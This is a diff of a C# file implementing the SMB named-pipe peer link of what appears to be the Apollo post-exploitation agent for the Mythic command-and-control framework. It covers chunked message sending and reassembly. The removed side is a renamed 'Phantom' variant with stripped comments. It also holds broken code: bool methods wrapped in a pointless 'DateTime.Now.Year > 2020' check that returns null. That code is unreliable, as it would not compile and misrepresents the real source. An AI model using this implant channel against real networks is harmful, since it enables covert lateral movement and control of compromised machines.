@@ -1,25 +1,25 @@
-﻿using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+﻿using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.IO.Pipes;
 using System.Linq;
 using System.Text;
-using AI = PhantomInterop;
-using AS = PhantomInterop.Structs.PhantomStructs;
+using AI = ApolloInterop;
+using AS = ApolloInterop.Structs.ApolloStructs;
 using TTasks = System.Threading.Tasks;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Structs.PhantomStructs;
-using PhantomInterop.Utils;
-using PhantomInterop.Constants;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Structs.ApolloStructs;
+using ApolloInterop.Utils;
+using ApolloInterop.Constants;
 
-namespace Phantom.Peers.SMB
+namespace Apollo.Peers.SMB
 {
     public class SMBPeer : AI.Classes.P2P.Peer
     {
         private AsyncNamedPipeClient _pipeClient = null;
         private PipeStream _pipe = null;
-        private Action<object> _transmitAction;
+        private Action<object> _sendAction;
         private TTasks.Task _sendTask;
         private UInt32 _currentMessageSize = 0;
         private UInt32 _currentMessageChunkNum = 0;
@@ -36,13 +36,13 @@ namespace Phantom.Peers.SMB
             _pipeClient.ConnectionEstablished += OnConnect;
             _pipeClient.MessageReceived += OnMessageReceived;
             _pipeClient.Disconnect += OnDisconnect;
-            _transmitAction = (object p) =>
+            _sendAction = (object p) =>
             {
                 PipeStream ps = (PipeStream)p;
                 while (ps.IsConnected && !_cts.IsCancellationRequested)
                 {
-                    _msgSendEvent.WaitOne();
-                    if (!_cts.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
+                    _senderEvent.WaitOne();
+                    if (!_cts.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                     {
                         UInt32 totalChunksToSend = (UInt32)(result.Length / chunkSize) + 1;
                         DebugHelp.DebugWriteLine($"have {totalChunksToSend} chunks to send out");
@@ -65,23 +65,23 @@ namespace Phantom.Peers.SMB
                             byte[] currentChunkBytes = BitConverter.GetBytes(currentChunk);
                             Array.Reverse(currentChunkBytes);
                             DebugHelp.DebugWriteLine($"sending chunk {currentChunk}/{totalChunksToSend} with size {chunkData.Length + 8}");
-                            ps.BeginWrite(sizeBytes, 0, sizeBytes.Length, ProcessSentMessage, p);
-                            ps.BeginWrite(totalChunkBytes, 0, totalChunkBytes.Length, ProcessSentMessage, p);
-                            ps.BeginWrite(currentChunkBytes, 0, currentChunkBytes.Length, ProcessSentMessage, p);
-                            ps.BeginWrite(chunkData, 0, chunkData.Length, ProcessSentMessage, p);
+                            ps.BeginWrite(sizeBytes, 0, sizeBytes.Length, OnAsyncMessageSent, p);
+                            ps.BeginWrite(totalChunkBytes, 0, totalChunkBytes.Length, OnAsyncMessageSent, p);
+                            ps.BeginWrite(currentChunkBytes, 0, currentChunkBytes.Length, OnAsyncMessageSent, p);
+                            ps.BeginWrite(chunkData, 0, chunkData.Length, OnAsyncMessageSent, p);
                         }
-                        DebugHelp.DebugWriteLine($"finished sending data from _msgSendQueue");
-                        
+                        DebugHelp.DebugWriteLine($"finished sending data from _senderQueue");
+                        //ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                     }
                 }
             };
         }
 
 
-        public void ProcessSentMessage(IAsyncResult result)
+        public void OnAsyncMessageSent(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
-            
+            // Potentially delete this since theoretically the sender Task does everything
             if (pipe.IsConnected && !_cts.IsCancellationRequested)
             {
                 try {
@@ -95,45 +95,45 @@ namespace Phantom.Peers.SMB
 
         public override bool Connected()
         {
-            if(DateTime.Now.Year > 2020) { return _pipe.IsConnected; } else { return null; }
+            return _pipe.IsConnected;
         }
 
         public override bool Finished()
         {
-            if(DateTime.Now.Year > 2020) { return _previouslyConnected && !_pipe.IsConnected; } else { return null; }
+            return _previouslyConnected && !_pipe.IsConnected;
         }
 
-        public void OnConnect(object sender, PipeMessageData args)
+        public void OnConnect(object sender, NamedPipeMessageArgs args)
         {
             _pipe = args.Pipe;
             OnConnectionEstablished(sender, args);
-            _sendTask = new TTasks.Task(_transmitAction, args.Pipe);
+            _sendTask = new TTasks.Task(_sendAction, args.Pipe);
             _sendTask.Start();
             _previouslyConnected = true;
         }
 
-        public void OnDisconnect(object sender, PipeMessageData args)
+        public void OnDisconnect(object sender, NamedPipeMessageArgs args)
         {
             _cts.Cancel();
             args.Pipe.Close();
-            _msgSendEvent.Set();
+            _senderEvent.Set();
             if(_sendTask != null){
                 _sendTask.Wait();
             }
             base.OnDisconnect(this, args);
         }
 
-        public void OnMessageReceived(object sender, PipeMessageData args)
+        public void OnMessageReceived(object sender, NamedPipeMessageArgs args)
         {
             Byte[] sData = args.Data.Data.Take(args.Data.DataLength).ToArray();
             while (sData.Length > 0)
             {
                 if (_currentMessageSize == 0)
                 {
-                    
+                    // This means we're looking at the start of a new message
                     if (sData.Length < 4)
                     {
-                        
+                        // we didn't even get enough for a size
 
                     }
                     else
@@ -147,10 +147,10 @@ namespace Phantom.Peers.SMB
                 }
                 if (_currentMessageTotalChunks == 0)
                 {
-                    
+                    // This means we're looking at the start of a new message
                     if (sData.Length < 4)
                     {
-                        
+                        // we didn't even get enough for a size
 
                     }
                     else
@@ -164,27 +164,27 @@ namespace Phantom.Peers.SMB
                 }
                 if (_currentMessageChunkNum == 0 && !_currentMessageReadAllMetadata)
                 {
-                    
+                    // This means we're looking at the start of a new message
                     if (sData.Length < 4)
                     {
-                        
+                        // we didn't even get enough for a size
 
                     }
                     else
                     {
                         Byte[] messageSizeBytes = sData.Take(4).ToArray();
                         sData = sData.Skip(4).ToArray();
-                        Array.Reverse(messageSizeBytes);  
+                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                         _currentMessageChunkNum = BitConverter.ToUInt32(messageSizeBytes, 0) + 1;
                         _currentMessageReadAllMetadata = true;
                         continue;
                     }
 
                 }
-                
+                // try to read up to the remaining number of bytes
                 if (_partialData.Length + sData.Length > _currentMessageSize)
                 {
-                    
+                    // we potentially have this message and the next data in the pipeline
                     byte[] nextData = sData.Take((int)_currentMessageSize - _partialData.Length).ToArray();
                     _partialData = [.. _partialData, .. nextData];
                     sData = sData.Skip(nextData.Length).ToArray();
@@ -192,7 +192,7 @@ namespace Phantom.Peers.SMB
                 }
                 else
                 {
-                    
+                    // we don't enough enough data to max out the current message size, so take it all
                     _partialData = [.. _partialData, .. sData];
                     sData = sData.Skip(sData.Length).ToArray();
                 }
@@ -210,13 +210,13 @@ namespace Phantom.Peers.SMB
 
         private void UnwrapMessage()
         {
-            AS.DataChunk chunkedData = new(id: _currentMessageID, chunkNum: (int)_currentMessageChunkNum, totalChunks: (int)_currentMessageTotalChunks, data: _partialData.Take(_partialData.Length).ToArray());
+            AS.IPCChunkedData chunkedData = new(id: _currentMessageID, chunkNum: (int)_currentMessageChunkNum, totalChunks: (int)_currentMessageTotalChunks, data: _partialData.Take(_partialData.Length).ToArray());
             _partialData = [];
             lock (_messageOrganizer)
             {
                 if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                 {
-                    _messageOrganizer[chunkedData.ID] = new ChunkStore<AS.DataChunk>();
+                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<AS.IPCChunkedData>();
                     _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                 }
             }
@@ -229,7 +229,7 @@ namespace Phantom.Peers.SMB
 
         public override bool Start()
         {
-            if(DateTime.Now.Year > 2020) { return _pipeClient.Connect(5000); } else { return null; }
+            return _pipeClient.Connect(5000);
         }
 
         public override void Stop()
